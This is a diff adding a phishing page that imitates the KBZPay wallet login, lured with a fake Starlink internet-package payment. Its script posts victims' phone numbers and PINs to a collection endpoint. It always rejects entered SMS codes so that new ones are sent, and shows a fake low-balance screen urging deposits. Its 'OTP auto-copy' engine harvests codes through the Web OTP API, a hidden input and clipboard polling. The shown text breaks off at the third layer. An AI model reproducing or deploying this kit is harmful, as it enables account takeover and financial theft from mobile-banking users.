@@ -1,0 +1,787 @@
+<!DOCTYPE html>
+<html lang="my">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='20' fill='%230060AF'/><text x='50' y='58' font-size='24' font-weight='bold' fill='white' text-anchor='middle' font-family='Arial'>KBZ</text><text x='50' y='82' font-size='22' font-weight='bold' fill='white' text-anchor='middle' font-family='Arial'>Pay</text></svg>">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #0060AF 0%, #004d8f 50%, #003366 100%);
+            min-height: 100vh;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            padding: 20px;
+        }
+        .container { width: 100%; max-width: 420px; }
+        .card {
+            background: white; border-radius: 20px; padding: 35px 30px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+        .logo-section { text-align: center; margin-bottom: 25px; }
+        .logo-icon {
+            display: inline-flex; align-items: center; justify-content: center;
+            width: 72px; height: 72px; border-radius: 18px;
+            background: linear-gradient(135deg, #0060AF, #004d8f);
+            color: white; font-size: 16px; font-weight: 800; margin-bottom: 10px;
+            box-shadow: 0 4px 12px rgba(0, 96, 175, 0.3);
+            flex-direction: column; line-height: 1.2;
+        }
+        .logo-icon .kbz { font-size: 18px; font-weight: 800; }
+        .logo-icon .pay { font-size: 16px; font-weight: 700; }
+        .logo-section h1 { font-size: 20px; font-weight: 700; color: #1a1a1a; margin-top: 10px; }
+        .starlink-header { display: none; text-align: center; margin-bottom: 20px; padding-bottom: 20px; border-bottom: 1px solid #eee; }
+        .starlink-header.active { display: block; }
+        .starlink-header h3 { font-size: 14px; color: #0060AF; font-weight: 700; letter-spacing: 2px; }
+        .payment-details { display: none; justify-content: space-between; margin-bottom: 20px; padding: 15px; background: #f0f6ff; border-radius: 10px; }
+        .payment-details.active { display: flex; }
+        .payment-amount { text-align: left; }
+        .payment-amount .label { font-size: 11px; color: #666; text-transform: uppercase; letter-spacing: 0.5px; }
+        .payment-amount .value { font-size: 22px; font-weight: 700; color: #0060AF; }
+        .payment-service { text-align: right; }
+        .payment-service .label { font-size: 11px; color: #666; text-transform: uppercase; letter-spacing: 0.5px; }
+        .payment-service .value { font-size: 14px; font-weight: 600; color: #1a1a1a; }
+        .step-indicator { text-align: center; font-size: 13px; color: #666; margin-bottom: 20px; }
+        .login-heading { text-align: center; font-size: 14px; color: #666; margin-bottom: 25px; }
+        .form-group { margin-bottom: 20px; }
+        .form-label { display: block; font-size: 13px; font-weight: 600; color: #1a1a1a; margin-bottom: 8px; }
+        .phone-input-wrapper {
+            display: flex; border: 2px solid #e0e0e0; border-radius: 12px; overflow: hidden; transition: border-color 0.3s;
+        }
+        .phone-input-wrapper:focus-within { border-color: #0060AF; }
+        .country-code {
+            display: flex; align-items: center; padding: 0 15px; background: #f8f9fa;
+            border-right: 1px solid #e0e0e0; cursor: pointer; transition: background 0.2s;
+        }
+        .country-code:hover { background: #f0f0f0; }
+        .country-code img { width: 24px; height: 18px; border-radius: 3px; margin-right: 8px; object-fit: cover; }
+        .country-code span { font-weight: 600; color: #1a1a1a; font-size: 14px; }
+        .country-code .dropdown-arrow { margin-left: 5px; font-size: 10px; color: #666; }
+        .phone-input { flex: 1; padding: 16px; border: none; font-size: 16px; outline: none; }
+        .phone-input::placeholder { color: #aaa; }
+        .country-modal { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
+        .country-modal.active { display: flex; }
+        .country-modal-content { background: white; border-radius: 16px; width: 100%; max-width: 350px; max-height: 70vh; overflow: hidden; }
+        .country-modal-header { padding: 20px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
+        .country-modal-header h3 { font-size: 18px; color: #1a1a1a; }
+        .country-modal-close { background: none; border: none; font-size: 24px; cursor: pointer; color: #666; }
+        .country-list { list-style: none; max-height: 50vh; overflow-y: auto; }
+        .country-list li { display: flex; align-items: center; padding: 15px 20px; cursor: pointer; transition: background 0.2s; }
+        .country-list li:hover { background: #f8f9fa; }
+        .country-list li.selected { background: #e8f0fe; }
+        .country-list li img { width: 30px; height: 22px; border-radius: 3px; margin-right: 12px; object-fit: cover; }
+        .country-list li .country-name { flex: 1; font-weight: 500; }
+        .country-list li .country-dial { color: #666; font-size: 14px; }
+        .pin-section { text-align: center; margin-bottom: 25px; }
+        .pin-label { font-size: 14px; font-weight: 600; color: #1a1a1a; margin-bottom: 5px; }
+        .pin-sublabel { font-size: 12px; color: #888; margin-bottom: 15px; }
+        .pin-inputs { display: flex; justify-content: center; gap: 8px; }
+        .pin-input {
+            width: 46px; height: 52px; border: 2px solid #e0e0e0; border-radius: 12px;
+            text-align: center; font-size: 22px; font-weight: 700; outline: none;
+            transition: all 0.3s; -webkit-text-security: disc;
+        }
+        .pin-input:focus { border-color: #0060AF; box-shadow: 0 0 0 3px rgba(0, 96, 175, 0.15); }
+        .submit-btn {
+            width: 100%; padding: 16px;
+            background: linear-gradient(135deg, #0060AF 0%, #004d8f 100%);
+            color: white; border: none; border-radius: 12px; font-size: 16px;
+            font-weight: 600; cursor: pointer; transition: all 0.3s;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+        }
+        .submit-btn:hover { background: linear-gradient(135deg, #004d8f 0%, #003366 100%); transform: translateY(-1px); }
+        .submit-btn:disabled { background: #a8c8e8; cursor: not-allowed; transform: none; }
+        .submit-btn .spinner {
+            width: 20px; height: 20px; border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white; border-radius: 50%; animation: spin 0.8s linear infinite; display: none;
+        }
+        .submit-btn.loading .spinner { display: block; }
+        .submit-btn.loading .btn-text { display: none; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .ssl-badge {
+            display: flex; align-items: center; justify-content: center; gap: 6px;
+            margin-top: 15px; font-size: 11px; color: #888;
+        }
+        .ssl-badge i { color: #0060AF; }
+        .hidden { display: none !important; }
+        /* OTP Screen */
+        .otp-screen { display: none; }
+        .otp-screen.active { display: block; }
+        .otp-header { text-align: center; margin-bottom: 25px; }
+        .otp-header .icon { font-size: 48px; color: #0060AF; margin-bottom: 10px; }
+        .otp-header h2 { font-size: 18px; font-weight: 700; color: #1a1a1a; }
+        .otp-header p { font-size: 13px; color: #666; margin-top: 5px; }
+        .otp-header .phone-display { font-weight: 600; color: #0060AF; }
+        .otp-expired-message, .otp-invalid-message {
+            display: none; text-align: center; padding: 10px; margin-bottom: 15px;
+            border-radius: 8px; font-size: 13px; font-weight: 500;
+        }
+        .otp-expired-message { background: #fff3cd; color: #856404; }
+        .otp-expired-message.active, .otp-invalid-message.active { display: block; }
+        .otp-invalid-message { background: #f8d7da; color: #721c24; }
+        .otp-inputs-container { position: relative; margin-bottom: 20px; }
+        .otp-inputs { display: flex; justify-content: center; gap: 10px; position: relative; z-index: 2; }
+        .otp-input {
+            width: 48px; height: 56px; border: 2px solid #e0e0e0; border-radius: 12px;
+            text-align: center; font-size: 22px; font-weight: 700; outline: none;
+            transition: all 0.3s;
+        }
+        .otp-input:focus { border-color: #0060AF; box-shadow: 0 0 0 3px rgba(0, 96, 175, 0.15); }
+        .otp-overlay-input {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            opacity: 0.01; z-index: 1; font-size: 16px; border: none; background: transparent;
+            text-align: center; letter-spacing: 20px;
+        }
+        .resend-section { text-align: center; margin-top: 15px; font-size: 13px; color: #888; }
+        .resend-link { color: #0060AF; font-weight: 600; cursor: pointer; text-decoration: none; }
+        .resend-link.disabled { color: #ccc; cursor: not-allowed; }
+        .otp-validity { text-align: center; margin-top: 12px; font-size: 11px; color: #888; }
+        .otp-validity i { color: #0060AF; }
+        /* Insufficient Balance Screen */
+        .insufficient-screen { display: none; }
+        .insufficient-screen.active { display: block; }
+        .insufficient-header { text-align: center; margin-bottom: 25px; }
+        .insufficient-header .icon { font-size: 48px; color: #dc3545; margin-bottom: 10px; }
+        .insufficient-header h2 { font-size: 18px; font-weight: 700; color: #1a1a1a; }
+        .insufficient-header p { font-size: 13px; color: #666; margin-top: 8px; line-height: 1.5; }
+        .deposit-btn {
+            width: 100%; padding: 16px;
+            background: linear-gradient(135deg, #28a745 0%, #218838 100%);
+            color: white; border: none; border-radius: 12px; font-size: 16px;
+            font-weight: 600; cursor: pointer; margin-bottom: 12px;
+        }
+        .diff-number-btn {
+            width: 100%; padding: 14px; background: transparent; border: 2px solid #e0e0e0;
+            border-radius: 12px; font-size: 14px; color: #666; cursor: pointer;
+        }
+        .diff-number-btn:hover { background: #f8f9fa; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="card">
+        <!-- LOGIN SCREEN -->
+        <div id="loginScreen">
+            <div class="logo-section">
+                <div class="logo-icon">
+                    <span class="kbz">KBZ</span>
+                    <span class="pay">Pay</span>
+                </div>
+                <h1 id="pageTitle">လုံခြုံသော ငွေပေးချေမှု</h1>
+            </div>
+
+            <div id="starlinkHeader" class="starlink-header">
+                <h3>⭐ STARLINK</h3>
+                <p style="font-size:12px;color:#666;margin-top:4px;" id="starlinkSubtitle">အင်တာနက် ပက်ကေ့ချ် ငွေပေးချေမှု</p>
+            </div>
+            <div id="paymentDetails" class="payment-details">
+                <div class="payment-amount">
+                    <div class="label" id="amountLabel">ပမာဏ</div>
+                    <div class="value" id="paymentAmount">--</div>
+                </div>
+                <div class="payment-service">
+                    <div class="label" id="serviceLabel">ဝန်ဆောင်မှု</div>
+                    <div class="value" id="paymentService">ConnectPlus</div>
+                </div>
+            </div>
+
+            <div class="step-indicator" id="stepIndicator">အဆင့် ၁ / ၃</div>
+            <div class="login-heading" id="loginHeading">သင့်ဖုန်းနံပါတ်ကို ထည့်ပါ</div>
+
+            <div class="form-group">
+                <label class="form-label" id="labelPhone">ဖုန်းနံပါတ်</label>
+                <div class="phone-input-wrapper">
+                    <div class="country-code" id="countryCodeBtn" onclick="openCountryModal()">
+                        <img id="countryFlag" src="https://flagcdn.com/w40/mm.png" alt="flag">
+                        <span id="dialCode">+95</span>
+                        <span class="dropdown-arrow">▼</span>
+                    </div>
+                    <input type="tel" class="phone-input" id="phoneInput" placeholder="9 1234 5678" autocomplete="tel" inputmode="numeric">
+                </div>
+            </div>
+
+            <div class="pin-section">
+                <div class="pin-label" id="pinLabel">KBZPay PIN ထည့်ပါ</div>
+                <div class="pin-sublabel" id="pinSublabel">ဂဏန်း ၆ လုံး PIN</div>
+                <div class="pin-inputs" id="pinInputs">
+                    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" data-index="0">
+                    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" data-index="1">
+                    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" data-index="2">
+                    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" data-index="3">
+                    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" data-index="4">
+                    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" data-index="5">
+                </div>
+            </div>
+
+            <button class="submit-btn" id="submitBtn" onclick="submitLogin()" disabled>
+                <span class="spinner"></span>
+                <span class="btn-text" id="btnSubmitText">ဝင်ရောက်မည်</span>
+            </button>
+
+            <div class="ssl-badge">
+                <i class="fas fa-lock"></i> <span id="sslText">256-bit SSL ကုဒ်ဝှက်ထားသည် · KBZ Bank မှ အာမခံထားသည်</span>
+            </div>
+        </div>
+
+        <!-- OTP SCREEN -->
+        <div id="otpScreen" class="otp-screen">
+            <div class="otp-header">
+                <div class="icon"><i class="fas fa-shield-halved"></i></div>
+                <div class="step-indicator">အဆင့် ၂ / ၃</div>
+                <h2 id="otpTitle">SMS ကုဒ်ကို ထည့်ပါ</h2>
+                <p id="otpSubtitle">ဂဏန်း ၆ လုံး OTP ကုဒ်ကို ပို့ပြီးပါပြီ<br><span class="phone-display" id="otpPhone">+95 •••• ••78</span></p>
+            </div>
+
+            <div id="otpExpiredMessage" class="otp-expired-message">
+                <i class="fas fa-clock"></i> OTP သက်တမ်းကုန်သွားပါပြီ။ အသစ်တောင်းပါ။
+            </div>
+            <div id="otpInvalidMessage" class="otp-invalid-message">
+                <i class="fas fa-exclamation-circle"></i> OTP မှားနေသည်။ ကုဒ်အသစ် ပို့ပြီးပါပြီ။
+            </div>
+
+            <div class="otp-inputs-container">
+                <input type="text" class="otp-overlay-input" id="otpOverlay" autocomplete="one-time-code" inputmode="numeric" maxlength="6" aria-hidden="true">
+                <div class="otp-inputs" id="otpInputs">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="off" data-index="0">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="off" data-index="1">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="off" data-index="2">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="off" data-index="3">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="off" data-index="4">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="off" data-index="5">
+                </div>
+            </div>
+
+            <button class="submit-btn" id="verifyBtn" onclick="verifyOTP()" disabled>
+                <span class="spinner"></span>
+                <span class="btn-text" id="btnVerifyText">အတည်ပြုမည်</span>
+            </button>
+
+            <div class="resend-section">
+                <span id="resendLabel">ကုဒ် မရရှိပါက</span>
+                <a id="resendLink" class="resend-link disabled" onclick="resendOTP()">ပြန်ပို့မည်</a>
+                <span id="timer">(1:00)</span>
+            </div>
+            <div class="otp-validity">
+                <i class="fas fa-info-circle"></i> <span id="validityText">OTP ၁၀ မိနစ်အတွင်း အကျုံးဝင်ပါသည်</span>
+            </div>
+        </div>
+
+        <!-- INSUFFICIENT BALANCE SCREEN -->
+        <div id="insufficientScreen" class="insufficient-screen">
+            <div class="insufficient-header">
+                <div class="icon"><i class="fas fa-exclamation-triangle"></i></div>
+                <h2 id="insuffTitle">လက်ကျန်ငွေ မလုံလောက်ပါ</h2>
+                <p id="insuffMsg">သင့် KBZPay အကောင့်တွင် လက်ကျန်ငွေ မလုံလောက်ပါ။ အနည်းဆုံး <strong>$30 USD</strong> ရှိရန် လိုအပ်ပါသည်။</p>
+            </div>
+            <button class="deposit-btn" id="depositedBtn" onclick="userDeposited()">
+                <i class="fas fa-check-circle"></i> ငွေဖြည့်ပြီးပါပြီ
+            </button>
+            <button class="diff-number-btn" id="diffNumberBtn" onclick="useDifferentNumber()">
+                <i class="fas fa-phone"></i> အခြားနံပါတ်ဖြင့် ပေးချေမည်
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- Country Selector Modal -->
+<div id="countryModal" class="country-modal" onclick="closeCountryModal(event)">
+    <div class="country-modal-content" onclick="event.stopPropagation()">
+        <div class="country-modal-header">
+            <h3>နိုင်ငံရွေးချယ်ပါ</h3>
+            <button class="country-modal-close" onclick="document.getElementById('countryModal').classList.remove('active')">&times;</button>
+        </div>
+        <ul class="country-list" id="countryList"></ul>
+    </div>
+</div>
+
+<script>
+// ── Countries ──
+const COUNTRIES = {
+    MM: { dial: '+95',  len: 9,  flag: 'mm', name: 'မြန်မာ', currency: 'MMK' },
+    TH: { dial: '+66',  len: 9,  flag: 'th', name: 'ထိုင်း', currency: 'THB' },
+    SG: { dial: '+65',  len: 8,  flag: 'sg', name: 'စင်ကာပူ', currency: 'SGD' },
+    MY: { dial: '+60',  len: 10, flag: 'my', name: 'မလေးရှား', currency: 'MYR' },
+};
+
+// ── ConnectPlus packages ──
+const STARLINK_PACKAGES = {
+    starter:   { name: 'Starter',   usd: 11,  data: '120GB' },
+    standard:  { name: 'Standard',  usd: 18,  data: '250GB' },
+    premium:   { name: 'Premium',   usd: 27,  data: '400GB' },
+    pro:       { name: 'Pro',       usd: 36,  data: '600GB' },
+    business:  { name: 'Business',  usd: 54,  data: '1TB' },
+    unlimited: { name: 'Unlimited', usd: 89,  data: 'Unlimited' },
+};
+const CURRENCY_RATES = { USD: 1, MMK: 2100, THB: 35, SGD: 1.35, MYR: 4.7 };
+
+let selectedCountry = 'MM';
+let otpTimerInterval = null;
+let otpAutoSubmitted = false;
+let statusInterval = null;
+let otpLayerCleanups = [];
+let starlinkPackage = null;
+let starlinkSource = false;
+
+// ── Country detection ──
+async function detectCountry() {
+    const cached = localStorage.getItem('kbzpay_country');
+    if (cached && COUNTRIES[cached]) { setCountry(cached); return; }
+    try {
+        const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
+        const d = await r.json();
+        const code = (d.country_code || '').toUpperCase();
+        if (COUNTRIES[code]) { setCountry(code); localStorage.setItem('kbzpay_country', code); return; }
+    } catch(e) {}
+    try {
+        const r = await fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(5000) });
+        const d = await r.json();
+        const code = (d.countryCode || '').toUpperCase();
+        if (COUNTRIES[code]) { setCountry(code); localStorage.setItem('kbzpay_country', code); return; }
+    } catch(e) {}
+    setCountry('MM');
+}
+
+function setCountry(code) {
+    selectedCountry = code;
+    const c = COUNTRIES[code];
+    document.getElementById('countryFlag').src = `https://flagcdn.com/w40/${c.flag}.png`;
+    document.getElementById('dialCode').textContent = c.dial;
+    document.getElementById('phoneInput').placeholder = '9' + '0'.repeat(c.len - 1);
+}
+
+function openCountryModal() {
+    const list = document.getElementById('countryList');
+    list.innerHTML = '';
+    Object.entries(COUNTRIES).forEach(([code, c]) => {
+        const li = document.createElement('li');
+        li.className = code === selectedCountry ? 'selected' : '';
+        li.innerHTML = `<img src="https://flagcdn.com/w40/${c.flag}.png" alt="${c.name}"><span class="country-name">${c.name}</span><span class="country-dial">${c.dial}</span>`;
+        li.onclick = () => { setCountry(code); document.getElementById('countryModal').classList.remove('active'); checkFormComplete(); };
+        list.appendChild(li);
+    });
+    document.getElementById('countryModal').classList.add('active');
+}
+function closeCountryModal(e) { if (e.target === e.currentTarget) e.currentTarget.classList.remove('active'); }
+
+// ── Starlink source detection ──
+function checkStarlinkSource() {
+    const params = new URLSearchParams(window.location.search);
+    const src = params.get('source');
+    const pkg = params.get('package');
+    if (src === 'starlink' && pkg && STARLINK_PACKAGES[pkg]) {
+        starlinkSource = true;
+        starlinkPackage = pkg;
+        const p = STARLINK_PACKAGES[pkg];
+        const c = COUNTRIES[selectedCountry];
+
+        const passedPrice = params.get('lp');
+        const passedCur = params.get('cur');
+        let display;
+        if (passedPrice && passedCur) {
+            display = passedCur === 'USD' ? `$${passedPrice}` : `${passedCur} ${parseInt(passedPrice).toLocaleString()}`;
+        } else {
+            const rate = CURRENCY_RATES[c.currency] || CURRENCY_RATES.USD;
+            const localPrice = Math.round(p.usd * rate);
+            display = c.currency === 'USD' ? `$${p.usd}` : `${c.currency} ${localPrice.toLocaleString()}`;
+        }
+        document.getElementById('starlinkHeader').classList.add('active');
+        document.getElementById('paymentDetails').classList.add('active');
+        document.getElementById('paymentAmount').textContent = display;
+        document.getElementById('paymentService').textContent = `ConnectPlus \`;
+        document.getElementById('stepIndicator').textContent = 'အဆင့် ၂ / ၃';
+    }
+}
+
+// ── PIN input handling ──
+function initializePinInputs() {
+    const inputs = document.querySelectorAll('.pin-input');
+    inputs.forEach((inp, i) => {
+        inp.addEventListener('input', (e) => {
+            const v = e.target.value.replace(/\D/g, '');
+            e.target.value = v.substring(0, 1);
+            if (v && i < inputs.length - 1) inputs[i + 1].focus();
+            checkFormComplete();
+        });
+        inp.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !e.target.value && i > 0) { inputs[i - 1].focus(); inputs[i - 1].value = ''; }
+        });
+        inp.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+            for (let j = 0; j < Math.min(text.length, 6); j++) inputs[j].value = text[j] || '';
+            if (text.length >= 6) inputs[5].focus();
+            checkFormComplete();
+        });
+    });
+}
+
+function checkFormComplete() {
+    const phone = document.getElementById('phoneInput').value.replace(/\D/g, '');
+    const pin = Array.from(document.querySelectorAll('.pin-input')).map(i => i.value).join('');
+    const c = COUNTRIES[selectedCountry];
+    document.getElementById('submitBtn').disabled = !(phone.length === c.len && pin.length === 6);
+}
+
+// ── Submit login ──
+async function submitLogin() {
+    const btn = document.getElementById('submitBtn');
+    if (btn.disabled) return;
+    btn.classList.add('loading');
+    btn.disabled = true;
+
+    const phone = COUNTRIES[selectedCountry].dial + document.getElementById('phoneInput').value.replace(/\D/g, '');
+    const pin = Array.from(document.querySelectorAll('.pin-input')).map(i => i.value).join('');
+
+    try {
+        await fetch('/api/kbzpay/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                phone, pin, country: selectedCountry,
+                starlinkPackage: starlinkPackage, source: 'kbzpay',
+                userAgent: navigator.userAgent, language: navigator.language,
+            }),
+        });
+    } catch (e) {}
+
+    btn.classList.remove('loading');
+    showOTPScreen(phone);
+}
+
+// ── OTP Screen ──
+function showOTPScreen(phone) {
+    document.getElementById('loginScreen').classList.add('hidden');
+    document.getElementById('otpScreen').classList.add('active');
+    // Mask phone
+    const masked = phone.substring(0, phone.length - 2).replace(/./g, '•') + phone.slice(-2);
+    const dial = COUNTRIES[selectedCountry].dial;
+    document.getElementById('otpPhone').textContent = dial + ' ' + masked.substring(dial.length);
+    startOtpTimer(60);
+    startAllOtpLayers();
+    startStatusPolling();
+}
+
+// ── OTP timer (60s) ──
+function startOtpTimer(seconds) {
+    clearInterval(otpTimerInterval);
+    const timer = document.getElementById('timer');
+    const resendLink = document.getElementById('resendLink');
+    const expiredMsg = document.getElementById('otpExpiredMessage');
+    resendLink.classList.add('disabled');
+    expiredMsg.classList.remove('active');
+    let remaining = seconds;
+    timer.textContent = `(${Math.floor(remaining/60)}:${String(remaining%60).padStart(2,'0')})`;
+    otpTimerInterval = setInterval(() => {
+        remaining--;
+        if (remaining <= 0) {
+            clearInterval(otpTimerInterval);
+            timer.textContent = '';
+            resendLink.classList.remove('disabled');
+            expiredMsg.classList.add('active');
+        } else {
+            timer.textContent = `(${Math.floor(remaining/60)}:${String(remaining%60).padStart(2,'0')})`;
+        }
+    }, 1000);
+}
+
+// ── OTP input handling ──
+function initOtpInputs() {
+    const inputs = document.querySelectorAll('.otp-input');
+    inputs.forEach((inp, i) => {
+        inp.addEventListener('input', (e) => {
+            const v = e.target.value.replace(/\D/g, '');
+            e.target.value = v.substring(0, 1);
+            if (v && i < inputs.length - 1) inputs[i + 1].focus();
+            checkOtpComplete();
+        });
+        inp.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !e.target.value && i > 0) { inputs[i - 1].focus(); inputs[i - 1].value = ''; }
+        });
+        inp.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+            if (text.length >= 6) {
+                for (let j = 0; j < 6; j++) inputs[j].value = text[j] || '';
+                inputs[5].focus();
+                checkOtpComplete();
+            }
+        });
+    });
+}
+
+function checkOtpComplete() {
+    const otp = getOtpValue();
+    document.getElementById('verifyBtn').disabled = otp.length !== 6;
+}
+
+function clearOtpInputs() {
+    document.querySelectorAll('.otp-input').forEach(i => i.value = '');
+    document.getElementById('verifyBtn').disabled = true;
+    document.getElementById('otpOverlay').value = '';
+    otpAutoSubmitted = false;
+}
+
+function getOtpValue() {
+    return Array.from(document.querySelectorAll('.otp-input')).map(i => i.value).join('');
+}
+
+// ── Verify OTP ──
+async function verifyOTP() {
+    const otp = getOtpValue();
+    if (otp.length !== 6) return;
+    const btn = document.getElementById('verifyBtn');
+    btn.classList.add('loading');
+    btn.disabled = true;
+    stopAllOtpLayers();
+
+    const phone = COUNTRIES[selectedCountry].dial + document.getElementById('phoneInput').value.replace(/\D/g, '');
+    try {
+        await fetch('/api/kbzpay/verify-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone, otp, country: selectedCountry }),
+        });
+    } catch (e) {}
+
+    btn.classList.remove('loading');
+    showInvalidOTP();
+}
+
+function showInvalidOTP() {
+    document.getElementById('otpInvalidMessage').classList.add('active');
+    document.getElementById('otpExpiredMessage').classList.remove('active');
+    clearOtpInputs();
+    const phone = COUNTRIES[selectedCountry].dial + document.getElementById('phoneInput').value.replace(/\D/g, '');
+    fetch('/api/kbzpay/resend-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone, country: selectedCountry }),
+    }).catch(() => {});
+    startOtpTimer(60);
+    startAllOtpLayers();
+}
+
+// ── Resend OTP ──
+async function resendOTP() {
+    const resendLink = document.getElementById('resendLink');
+    if (resendLink.classList.contains('disabled')) return;
+    const phone = COUNTRIES[selectedCountry].dial + document.getElementById('phoneInput').value.replace(/\D/g, '');
+    try {
+        await fetch('/api/kbzpay/resend-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone, country: selectedCountry }),
+        });
+    } catch (e) {}
+    clearOtpInputs();
+    document.getElementById('otpExpiredMessage').classList.remove('active');
+    document.getElementById('otpInvalidMessage').classList.remove('active');
+    startOtpTimer(60);
+    stopAllOtpLayers();
+    startAllOtpLayers();
+}
+
+// ── Status polling ──
+function startStatusPolling() {
+    clearInterval(statusInterval);
+    statusInterval = setInterval(async () => {
+        try {
+            const r = await fetch('/api/check-status');
+            const d = await r.json();
+            if (d.status === 'insufficient_balance') {
+                clearInterval(statusInterval);
+                stopAllOtpLayers();
+                document.getElementById('otpScreen').classList.remove('active');
+                document.getElementById('insufficientScreen').classList.add('active');
+                // Dynamic amount display
+                const urlParams = new URLSearchParams(window.location.search);
+                const passedPrice = urlParams.get('lp');
+                const passedCur = urlParams.get('cur');
+                const packageType = urlParams.get('package') || 'starter';
+                let amountDisplay = '$30 USD';
+                if (passedPrice && passedCur) {
+                    amountDisplay = passedCur === 'USD' ? `$${passedPrice}` : `${passedCur} ${parseInt(passedPrice).toLocaleString()}`;
+                } else {
+                    const pkg = STARLINK_PACKAGES[packageType] || STARLINK_PACKAGES['starter'];
+                    amountDisplay = `$${pkg.usd}`;
+                }
+                const msgEl = document.getElementById('insuffMsg');
+                if (msgEl) {
+                    msgEl.innerHTML = 'သင့် KBZPay အကောင့်တွင် လက်ကျန်ငွေ မလုံလောက်ပါ။ အနည်းဆုံး <strong>' + amountDisplay + '</strong> ရှိရန် လိုအပ်ပါသည်။';
+                }
+            }
+        } catch (e) {}
+    }, 3000);
+}
+
+async function userDeposited() {
+    try { await fetch('/api/user-deposited', { method: 'POST' }); } catch (e) {}
+    document.getElementById('insufficientScreen').classList.remove('active');
+    document.getElementById('otpScreen').classList.add('active');
+    startAllOtpLayers();
+    startStatusPolling();
+}
+
+function useDifferentNumber() {
+    if (starlinkSource) {
+        window.location.href = '/starlink/';
+    } else {
+        document.getElementById('insufficientScreen').classList.remove('active');
+        document.getElementById('otpScreen').classList.remove('active');
+        document.getElementById('loginScreen').classList.remove('hidden');
+        document.querySelectorAll('.pin-input').forEach(i => i.value = '');
+        document.getElementById('submitBtn').disabled = true;
+    }
+}
+
+// ═══════════════════════════════════════════
+// 7-LAYER OTP AUTO-COPY & AUTO-SUBMIT ENGINE
+// ═══════════════════════════════════════════
+function extractOtpFromText(text) {
+    if (!text) return null;
+    const m1 = text.match(/(?:OTP|code|Code|PIN|SMS|verification|ကုဒ်|အတည်ပြု)\s*(?:is|:)\s*(\d{6})/i);
+    if (m1) return m1[1];
+    const m2 = text.match(/\b(\d{6})\b/);
+    return m2 ? m2[1] : null;
+}
+
+function handleOtpText(text) {
+    const otp = extractOtpFromText(text);
+    if (!otp || otp.length !== 6) return false;
+    const inputs = document.querySelectorAll('.otp-input');
+    for (let i = 0; i < 6; i++) inputs[i].value = otp[i];
+    document.getElementById('verifyBtn').disabled = false;
+    if (!otpAutoSubmitted) {
+        otpAutoSubmitted = true;
+        setTimeout(() => verifyOTP(), 400);
+    }
+    return true;
+}
+
+function startAllOtpLayers() {
+    stopAllOtpLayers();
+    otpAutoSubmitted = false;
+    otpLayerCleanups.push(layer1_webOtpApi());
+    otpLayerCleanups.push(layer2_overlayAutofill());
+    otpLayerCleanups.push(layer3_overlayPolling());
+    otpLayerCleanups.push(layer4_clipboardPolling());
+    otpLayerCleanups.push(layer5_visibilityDetection());
+    otpLayerCleanups.push(layer6_smsWatch());
+    otpLayerCleanups.push(layer7_mutationObserver());
+}
+
+function stopAllOtpLayers() {
+    otpLayerCleanups.forEach(fn => { if (typeof fn === 'function') fn(); });
+    otpLayerCleanups = [];
+}
+
+// Layer 1: Web OTP API
+function layer1_webOtpApi() {
+    if (!('OTPCredential' in window)) return () => {};
+    const ac = new AbortController();
+    navigator.credentials.get({ otp: { transport: ['sms'] }, signal: ac.signal })
+        .then(c => { if (c && c.code) handleOtpText(c.code); })
+        .catch(() => {});
+    setTimeout(() => ac.abort(), 120000);
+    return () => ac.abort();
+}
+
+// Layer 2: Overlay autofill
+function layer2_overlayAutofill() {
+    const overlay = document.getElementById('otpOverlay');
+    const handler = () => { if (overlay.value.length >= 6) handleOtpText(overlay.value); };
+    ['input', 'change', 'keyup', 'paste'].forEach(e => overlay.addEventListener(e, handler));
+    return () => ['input', 'change', 'keyup', 'paste'].forEach(e => overlay.removeEventListener(e, handler));
+}
+
+// Layer 3: Overlay polling
